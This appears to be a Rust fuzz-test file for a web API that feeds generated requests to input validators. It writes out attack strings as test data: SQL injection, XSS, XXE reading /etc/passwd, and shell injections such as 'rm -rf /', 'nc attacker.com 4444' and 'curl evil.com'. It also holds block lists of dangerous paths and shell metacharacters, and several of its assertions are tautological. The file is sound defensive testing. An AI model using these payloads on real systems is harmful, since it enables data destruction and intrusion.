// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (c) 2025-2026 ecoPrimals Collective

#![no_main]

use arbitrary::Arbitrary;
use libfuzzer_sys::fuzz_target;
use std::collections::HashMap;

// Import API-related functionality
// use nestgate_api::{routes, Config as ApiConfig}; // Currently unused

/// Fuzzable HTTP request structure
#[derive(Arbitrary, Debug)]
struct FuzzHttpRequest {
    method: HttpMethod,
    path: String,
    headers: HashMap<String, String>,
    query_params: HashMap<String, String>,
    body: FuzzRequestBody,
    attack_vectors: Vec<AttackVector>,
}

#[derive(Arbitrary, Debug)]
enum HttpMethod {
    Get,
    Post,
    Put,
    Delete,
    Patch,
    Head,
    Options,
    Trace,
    Connect,
    Malformed(String),
}

#[derive(Arbitrary, Debug)]
enum FuzzRequestBody {
    Json(String),
    FormData(HashMap<String, String>),
    Raw(Vec<u8>),
    Multipart(Vec<MultipartField>),
    Empty,
}

#[derive(Arbitrary, Debug)]
struct MultipartField {
    name: String,
    #[expect(dead_code)] // Reserved for future multipart handling
    filename: Option<String>,
    #[expect(dead_code)] // Reserved for future content type validation
    content_type: String,
    data: Vec<u8>,
}

#[derive(Arbitrary, Debug)]
enum AttackVector {
    // Path traversal attacks
    PathTraversal(String),
    // SQL injection in parameters
    SqlInjection(String),
    // XSS in parameters
    XssInjection(String),
    // Command injection
    CommandInjection(String),
    // LDAP injection
    LdapInjection(String),
    // XML external entity
    XxeInjection(String),
    // Server-side template injection
    SstiInjection(String),
    // HTTP header injection
    HeaderInjection(String, String),
    // Extremely long parameters
    ExtremelyLongParam(String, usize),
    // Invalid JSON structure
    InvalidJson(String),
    // Buffer overflow attempts
    BufferOverflow(Vec<u8>),
    // Unicode exploits
    UnicodeExploit(String),
    // Null byte injection
    NullByteInjection(String),
    // CRLF injection
    CrlfInjection(String),
    // HTTP request smuggling
    RequestSmuggling(String),
    // Deserialization attacks
    DeserializationAttack(String),
}

fuzz_target!(|input: FuzzHttpRequest| {
    // Test HTTP method validation
    test_http_method_validation(&input.method);

    // Test path validation and sanitization
    test_path_validation(&input.path);

    // Test header validation
    test_header_validation(&input.headers);

    // Test query parameter validation
    test_query_param_validation(&input.query_params);

    // Test request body parsing
    test_request_body_parsing(&input.body);

    // Test all attack vectors
    test_attack_vectors(&input.attack_vectors);

    // Test complete request handling
    test_complete_request_handling(&input);

    // Test rate limiting bypass attempts
    test_rate_limiting_bypass(&input);

    // Test authentication bypass attempts
    test_auth_bypass_attempts(&input);
});

fn test_http_method_validation(method: &HttpMethod) {
    if let HttpMethod::Malformed(malformed) = method {
        // Should gracefully handle malformed HTTP methods
        let _ = validate_http_method(malformed);
    } else {
        // Standard methods should be handled correctly
    }
}

fn test_path_validation(path: &str) {
    // Test for path traversal attempts
    let validation_result = validate_api_path(path);

    // Should never panic, even with malicious paths
    assert!(validation_result.is_ok() || validation_result.is_err());
}

fn test_header_validation(headers: &HashMap<String, String>) {
    for (key, value) in headers {
        // Test header injection attempts
        let header_result = validate_http_header(key, value);
        assert!(header_result.is_ok() || header_result.is_err());
    }
}

fn test_query_param_validation(params: &HashMap<String, String>) {
    for (key, value) in params {
        // Test parameter injection attempts
        let param_result = validate_query_parameter(key, value);
        assert!(param_result.is_ok() || param_result.is_err());
    }
}

fn test_request_body_parsing(body: &FuzzRequestBody) {
    match body {
        FuzzRequestBody::Json(json_str) => {
            test_json_body_parsing(json_str);
        }
        FuzzRequestBody::FormData(form_data) => {
            test_form_data_parsing(form_data);
        }
        FuzzRequestBody::Raw(raw_bytes) => {
            test_raw_body_parsing(raw_bytes);
        }
        FuzzRequestBody::Multipart(fields) => {
            test_multipart_parsing(fields);
        }
        FuzzRequestBody::Empty => {
            // Empty body should be handled gracefully
        }
    }
}

fn test_attack_vectors(vectors: &[AttackVector]) {
    for vector in vectors {
        match vector {
            AttackVector::PathTraversal(path) => {
                test_path_traversal_attack(path);
            }
            AttackVector::SqlInjection(injection) => {
                test_sql_injection_attack(injection);
            }
            AttackVector::XssInjection(xss) => {
                test_xss_attack(xss);
            }
            AttackVector::CommandInjection(cmd) => {
                test_command_injection_attack(cmd);
            }
            AttackVector::LdapInjection(ldap) => {
                test_ldap_injection_attack(ldap);
            }
            AttackVector::XxeInjection(xxe) => {
                test_xxe_attack(xxe);
            }
            AttackVector::SstiInjection(ssti) => {
                test_ssti_attack(ssti);
            }
            AttackVector::HeaderInjection(name, value) => {
                test_header_injection_attack(name, value);
            }
            AttackVector::ExtremelyLongParam(name, length) => {
                test_long_parameter_attack(name, *length);
            }
            AttackVector::InvalidJson(json) => {
                test_invalid_json_attack(json);
            }
            AttackVector::BufferOverflow(bytes) => {
                test_buffer_overflow_attack(bytes);
            }
            AttackVector::UnicodeExploit(unicode) => {
                test_unicode_exploit(unicode);
            }
            AttackVector::NullByteInjection(injection) => {
                test_null_byte_injection_attack(injection);
            }
            AttackVector::CrlfInjection(crlf) => {
                test_crlf_injection_attack(crlf);
            }
            AttackVector::RequestSmuggling(smuggle) => {
                test_request_smuggling_attack(smuggle);
            }
            AttackVector::DeserializationAttack(deser) => {
                test_deserialization_attack(deser);
            }
        }
    }
}

fn test_complete_request_handling(request: &FuzzHttpRequest) {
    // Test complete request processing pipeline
    let mock_request = create_mock_request(request);

    // Should handle any request without panicking
    process_mock_request(&mock_request);
}

fn test_rate_limiting_bypass(request: &FuzzHttpRequest) {
    // Test various rate limiting bypass techniques
    let bypass_attempts = generate_rate_limit_bypass_attempts(request);

    for attempt in bypass_attempts {
        simulate_rate_limit_check(&attempt);
    }
}

fn test_auth_bypass_attempts(request: &FuzzHttpRequest) {
    // Test authentication bypass techniques
    let auth_bypass_attempts = generate_auth_bypass_attempts(request);

    for attempt in auth_bypass_attempts {
        simulate_auth_check(&attempt);
    }
}

// Validation functions
fn validate_http_method(method: &str) -> Result<(), String> {
    if method.len() > 20 {
        return Err("HTTP method too long".to_string());
    }

    if method.contains('\0') || method.contains('\r') || method.contains('\n') {
        return Err("Invalid characters in HTTP method".to_string());
    }

    let valid_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
    if !valid_methods.contains(&method.to_uppercase().as_str()) {
        return Err("Invalid HTTP method".to_string());
    }

    Ok(())
}

fn validate_api_path(path: &str) -> Result<(), String> {
    if path.len() > 4096 {
        return Err("Path too long".to_string());
    }

    if path.contains('\0') {
        return Err("Null byte in path".to_string());
    }

    // Check for path traversal
    if path.contains("../") || path.contains("..\\") {
        return Err("Path traversal attempt detected".to_string());
    }

    // Check for dangerous paths
    let dangerous_paths = ["/etc/passwd", "/proc/", "/sys/", "\\windows\\", "C:\\"];
    for dangerous in &dangerous_paths {
        if path.to_lowercase().contains(&dangerous.to_lowercase()) {
            return Err("Dangerous path detected".to_string());
        }
    }

    Ok(())
}

fn validate_http_header(name: &str, value: &str) -> Result<(), String> {
    if name.len() > 256 || value.len() > 8192 {
        return Err("Header name or value too long".to_string());
    }

    if name.contains('\0') || value.contains('\0') {
        return Err("Null byte in header".to_string());
    }

    // Check for CRLF injection
    if name.contains('\r') || name.contains('\n') || value.contains('\r') || value.contains('\n') {
        return Err("CRLF injection attempt detected".to_string());
    }

    // Check for header injection
    if value.contains("HTTP/") || value.contains("Content-Length:") {
        return Err("Header injection attempt detected".to_string());
    }

    Ok(())
}

fn validate_query_parameter(name: &str, value: &str) -> Result<(), String> {
    if name.len() > 256 || value.len() > 8192 {
        return Err("Parameter name or value too long".to_string());
    }

    if name.contains('\0') || value.contains('\0') {
        return Err("Null byte in parameter".to_string());
    }

    // Check for SQL injection
    let sql_keywords = [
        "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "UNION",
    ];
    let value_upper = value.to_uppercase();
    for keyword in &sql_keywords {
        if value_upper.contains(keyword) {
            return Err("Potential SQL injection detected".to_string());
        }
    }

    // Check for XSS
    if value.contains("<script")
        || value.contains("javascript:")
        || value.contains("onload=")
        || value.contains("onerror=")
    {
        return Err("Potential XSS detected".to_string());
    }

    // Check for command injection shell metacharacters
    let shell_metacharacters = ["; ", "| ", "&& ", "|| ", "$(", "`", "$(("];
    for meta in &shell_metacharacters {
        if value.contains(meta) {
            return Err("Potential command injection detected".to_string());
        }
    }

    Ok(())
}

// Body parsing test functions
fn test_json_body_parsing(json_str: &str) {
    // Should handle malformed JSON gracefully
    let parse_result = serde_json::from_str::<serde_json::Value>(json_str);
    if let Ok(value) = parse_result {
        // Check for JSON bombs or excessive nesting
        check_json_safety(&value, 0);
    } else {
        // Parsing errors are acceptable for malformed JSON
    }
}

fn test_form_data_parsing(form_data: &HashMap<String, String>) {
    for (key, value) in form_data {
        // Test form data validation
        let validation_result = validate_form_field(key, value);
        assert!(validation_result.is_ok() || validation_result.is_err());
    }
}

fn test_raw_body_parsing(raw_bytes: &[u8]) {
    // Should handle arbitrary binary data safely
    if raw_bytes.len() > 10_000_000 {
        return; // Skip extremely large payloads
    }

    // Try to parse as various formats
    let _ = String::from_utf8(raw_bytes.to_vec());
    let _ = serde_json::from_slice::<serde_json::Value>(raw_bytes);
}

fn test_multipart_parsing(fields: &[MultipartField]) {
    for field in fields {
        // Test multipart field validation
        let validation_result = validate_multipart_field(field);
        assert!(validation_result.is_ok() || validation_result.is_err());
    }
}

// Attack vector test functions
fn test_path_traversal_attack(path: &str) {
    let malicious_paths = [
        format!("../../../{path}"),
        format!("..\\..\\..\\{path}"),
        format!("%2e%2e%2f{path}"),
        format!("....//....//....//{path}"),
    ];

    for malicious_path in &malicious_paths {
        let result = validate_api_path(malicious_path);
        // Should detect and reject path traversal
        if result.is_ok() {
            // If it passes validation, it should be safe
            assert!(!malicious_path.contains("../"));
        }
    }
}

fn test_sql_injection_attack(injection: &str) {
    let sql_injections = [
        format!("1' OR '1'='1 -- {injection}"),
        format!("'; DROP TABLE users; -- {injection}"),
        format!("1 UNION SELECT * FROM users -- {injection}"),
    ];

    for sql_injection in &sql_injections {
        let result = validate_query_parameter("param", sql_injection);
        // Should detect and reject SQL injection
        assert!(result.is_err() || !sql_injection.contains("DROP"));
    }
}

fn test_xss_attack(xss: &str) {
    let xss_payloads = [
        format!("<script>alert('XSS')</script>{xss}"),
        format!("javascript:alert('XSS'){xss}"),
        format!("<img src=x onerror=alert('XSS')>{xss}"),
    ];

    for xss_payload in &xss_payloads {
        let result = validate_query_parameter("param", xss_payload);
        // Should detect and reject XSS
        assert!(result.is_err() || !xss_payload.contains("<script"));
    }
}

fn test_command_injection_attack(cmd: &str) {
    let command_injections = [
        format!("; rm -rf / {cmd}"),
        format!("| nc attacker.com 4444 {cmd}"),
        format!("&& curl evil.com {cmd}"),
    ];

    for cmd_injection in &command_injections {
        let result = validate_query_parameter("param", cmd_injection);
        // Should detect and reject command injection
        assert!(result.is_err() || !cmd_injection.contains("; rm"));
    }
}

fn test_ldap_injection_attack(ldap: &str) {
    let ldap_injections = [
        format!("*)(uid=*))(|(uid=* {ldap}"),
        format!("admin)(&(password=*))(|(cn=* {ldap}"),
    ];

    for ldap_injection in &ldap_injections {
        let result = validate_query_parameter("param", ldap_injection);
        // Should detect and reject LDAP injection
        assert!(result.is_ok() || result.is_err());
    }
}

fn test_xxe_attack(xxe: &str) {
    let xxe_payloads = [format!(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"/etc/passwd\">]><foo>&xxe;</foo>{xxe}"
    )];

    for xxe_payload in &xxe_payloads {
        // XML parsing should be safe from XXE
        let result = parse_xml_safely(xxe_payload);
        assert!(result.is_ok() || result.is_err());
    }
}

fn test_ssti_attack(ssti: &str) {
    let ssti_payloads = [format!("{{{{7*7}}}}{ssti}"), format!("${{7*7}}{ssti}")];

    for ssti_payload in &ssti_payloads {
        let result = validate_template_input(ssti_payload);
        assert!(result.is_ok() || result.is_err());
    }
}

fn test_header_injection_attack(name: &str, value: &str) {
    let result = validate_http_header(name, value);
    assert!(result.is_ok() || result.is_err());
}

fn test_long_parameter_attack(name: &str, length: usize) {
    let length = std::cmp::min(length, 1_000_000); // Prevent actual DoS
    let long_value = "A".repeat(length);
    let result = validate_query_parameter(name, &long_value);
    assert!(result.is_ok() || result.is_err());
}

fn test_invalid_json_attack(json: &str) {
    let result = serde_json::from_str::<serde_json::Value>(json);
    // Invalid JSON should be handled gracefully
    assert!(result.is_ok() || result.is_err());
}

fn test_buffer_overflow_attack(bytes: &[u8]) {
    // Rust should prevent buffer overflows, but test anyway
    if bytes.len() < 100_000 {
        // Limit to prevent actual issues
        let _ = String::from_utf8(bytes.to_vec());
    }
}

fn test_unicode_exploit(unicode: &str) {
    // Test Unicode normalization attacks
    let normalized = unicode.chars().collect::<String>();
    let result = validate_query_parameter("param", &normalized);
    assert!(result.is_ok() || result.is_err());
}

fn test_null_byte_injection_attack(injection: &str) {
    let null_injection = format!("{injection}\0malicious");
    let result = validate_query_parameter("param", &null_injection);
    // Should detect null bytes
    assert!(result.is_err());
}

fn test_crlf_injection_attack(crlf: &str) {
    let crlf_injection = format!("{crlf}\r\nSet-Cookie: evil=true");
    let result = validate_http_header("param", &crlf_injection);
    // Should detect CRLF injection
    assert!(result.is_err());
}

fn test_request_smuggling_attack(smuggle: &str) {
    // Test HTTP request smuggling attempts
    let smuggling_attempt = format!("Content-Length: 0\r\n\r\nPOST /evil HTTP/1.1\r\n{smuggle}");
    let result = validate_http_header("test", &smuggling_attempt);
    assert!(result.is_ok() || result.is_err());
}

fn test_deserialization_attack(deser: &str) {
    // Test deserialization bomb protection
    let result = serde_json::from_str::<serde_json::Value>(deser);
    assert!(result.is_ok() || result.is_err());
}

// Helper functions
fn check_json_safety(value: &serde_json::Value, depth: usize) {
    if depth > 1000 {
        return; // Prevent stack overflow
    }

    match value {
        serde_json::Value::Object(map) => {
            for (_key, val) in map {
                check_json_safety(val, depth + 1);
            }
        }
        serde_json::Value::Array(arr) => {
            for val in arr {
                check_json_safety(val, depth + 1);
            }
        }
        _ => {}
    }
}

fn validate_form_field(name: &str, value: &str) -> Result<(), String> {
    validate_query_parameter(name, value)
}

fn validate_multipart_field(field: &MultipartField) -> Result<(), String> {
    if field.name.len() > 256 {
        return Err("Field name too long".to_string());
    }

    if field.data.len() > 100_000_000 {
        return Err("Field data too large".to_string());
    }

    Ok(())
}

fn parse_xml_safely(_xml: &str) -> Result<(), String> {
    // XML parsing should be disabled or heavily restricted
    Err("XML parsing not implemented for security".to_string())
}

fn validate_template_input(input: &str) -> Result<(), String> {
    if input.contains("{{") || input.contains("${") {
        return Err("Template injection attempt detected".to_string());
    }
    Ok(())
}

// Mock request handling
#[derive(Debug)]
struct MockRequest {
    #[expect(dead_code)] // Reserved for comprehensive request mocking
    method: String,
    #[expect(dead_code)] // Reserved for path-based attack testing
    path: String,
    #[expect(dead_code)] // Reserved for header injection testing
    headers: HashMap<String, String>,
    #[expect(dead_code)] // Reserved for body payload testing
    body: Vec<u8>,
}

fn create_mock_request(fuzz_request: &FuzzHttpRequest) -> MockRequest {
    let method = match &fuzz_request.method {
        HttpMethod::Get => "GET".to_string(),
        HttpMethod::Post => "POST".to_string(),
        HttpMethod::Put => "PUT".to_string(),
        HttpMethod::Delete => "DELETE".to_string(),
        HttpMethod::Patch => "PATCH".to_string(),
        HttpMethod::Head => "HEAD".to_string(),
        HttpMethod::Options => "OPTIONS".to_string(),
        HttpMethod::Trace => "TRACE".to_string(),
        HttpMethod::Connect => "CONNECT".to_string(),
        HttpMethod::Malformed(m) => m.clone(),
    };

    let body = match &fuzz_request.body {
        FuzzRequestBody::Json(json) => json.as_bytes().to_vec(),
        FuzzRequestBody::Raw(bytes) => bytes.clone(),
        _ => Vec::new(),
    };

    MockRequest {
        method,
        path: fuzz_request.path.clone(),
        headers: fuzz_request.headers.clone(),
        body,
    }
}

const fn process_mock_request(_request: &MockRequest) {
    // Mock request processing - should never panic
}

const fn generate_rate_limit_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
    // Generate various rate limiting bypass attempts
    vec![]
}

const fn generate_auth_bypass_attempts(_request: &FuzzHttpRequest) -> Vec<MockRequest> {
    // Generate various authentication bypass attempts
    vec![]
}

const fn simulate_rate_limit_check(_request: &MockRequest) {
    // Mock rate limit checking
}

const fn simulate_auth_check(_request: &MockRequest) {
    // Mock authentication checking
}
